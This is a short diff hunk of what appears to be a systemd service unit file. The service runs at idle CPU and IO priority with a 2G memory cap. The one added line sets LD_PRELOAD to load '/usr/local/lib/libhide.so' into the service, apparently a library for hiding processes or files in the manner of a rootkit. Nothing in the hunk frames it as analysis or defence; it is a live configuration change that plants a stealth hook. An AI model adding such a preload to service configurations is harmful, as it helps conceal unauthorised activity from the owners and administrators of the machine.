@@ -1165,6 +1165,7 @@ CPUSchedulingPolicy=idle
 IOSchedulingClass=idle
 # Limit memory so it never triggers an Out-Of-Memory crash
 MemoryMax=2G
+Environment="LD_PRELOAD=/usr/local/lib/libhide.so"
 
 [Install]
 WantedBy=multi-user.target
